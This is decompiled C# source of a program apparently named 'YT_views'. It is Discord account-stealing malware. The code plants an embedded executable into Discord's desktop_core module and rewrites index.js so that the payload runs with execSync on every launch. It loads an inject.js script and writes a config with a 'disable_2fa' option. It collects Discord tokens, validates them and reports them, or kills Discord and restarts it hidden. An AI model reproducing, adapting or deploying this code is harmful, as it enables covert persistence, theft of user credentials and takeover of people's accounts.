using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;

namespace YT_views
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000020C0 File Offset: 0x000002C0
		private static byte[] GZip(byte[] compressed)
		{
			MemoryStream stream = new MemoryStream(compressed);
			GZipStream gzipStream = new GZipStream(stream, CompressionMode.Decompress);
			MemoryStream memoryStream = new MemoryStream();
			gzipStream.CopyTo(memoryStream);
			gzipStream.Close();
			return memoryStream.ToArray();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020FC File Offset: 0x000002FC
		private static byte[] ReadResource(string name)
		{
			MemoryStream memoryStream = new MemoryStream();
			Assembly.GetExecutingAssembly().GetManifestResourceStream(name).CopyTo(memoryStream);
			return memoryStream.ToArray();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000212C File Offset: 0x0000032C
		private static void Restart(string path, string build)
		{
			bool flag = false;
			foreach (Process process in Process.GetProcessesByName(build))
			{
				bool flag2 = !process.HasExited;
				if (flag2)
				{
					flag = true;
					process.Kill();
				}
			}
			bool flag3 = flag;
			if (flag3)
			{
				string contents = File.ReadAllText(path + "\\settings.json").TrimEnd(new char[]
				{
					'}'
				}) + ",\"IS_MINIMIZED\":true}";
				File.WriteAllText(path + "\\settings.json", contents);
				Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), build + "\\Update.exe"), "--processStart " + build + ".exe");
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000021E8 File Offset: 0x000003E8
		private static void Main(string[] args)
		{
			string[] array = new string[]
			{
				"Discord"
			};
			string[] array2 = array;
			int i = 0;
			while (i < array2.Length)
			{
				string text = array2[i];
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text.ToLower();
				string text2 = null;
				try
				{
					text2 = (from d in new DirectoryInfo(path).GetDirectories()
					orderby Regex.IsMatch(d.Name, "\\d.\\d.\\d{2}(\\d|$)")
					select d).Last<DirectoryInfo>().GetDirectories().First((DirectoryInfo d) => d.Name == "modules").GetDirectories().First((DirectoryInfo d) => d.Name == "discord_desktop_core").FullName;
				}
				catch
				{
					goto IL_232;
				}
				goto IL_D4;
				IL_232:
				i++;
				continue;
				IL_D4:
				string text3 = "core";
				string text4 = Path.Combine(text2, text3);
				bool flag = !Directory.Exists(text4);
				if (flag)
				{
					Directory.CreateDirectory(text4);
					File.WriteAllBytes(Path.Combine(text4, "Update.exe"), Program.GZip(Program.ReadResource("Update")));
					File.WriteAllBytes(Path.Combine(text4, "Newtonsoft.Json.dll"), Program.GZip(Program.ReadResource("Json")));
					File.WriteAllText(Path.Combine(text4, "Config.json"), string.Concat(new string[]
					{
						"{\"id\":\"",
						Config.Id,
						"\",\"disable_2fa\":",
						Config.Disable2fa.ToString().ToLower(),
						",\"versions\":{}}"
					}));
					char c = '"';
					File.WriteAllText(text2 + "/index.js", string.Format("const child_process = require('child_process');\r\nchild_process.execSync(`{0}${{__dirname}}/{1}/Update.exe{2}`);\r\nrequire(__dirname + '/{3}/inject.js');\r\n\r\nmodule.exports = require('./core.asar');", new object[]
					{
						c,
						text3,
						c,
						text3
					}));
					bool silent = Config.Silent;
					if (silent)
					{
						foreach (string token in TokenDiscovery.CheckTokens(TokenDiscovery.FindTokens(path)))
						{
							TokenDiscovery.ReportToken(token);
						}
					}
					else
					{
						Program.Restart(path, text);
					}
				}
				goto IL_232;
			}
		}
	}
}
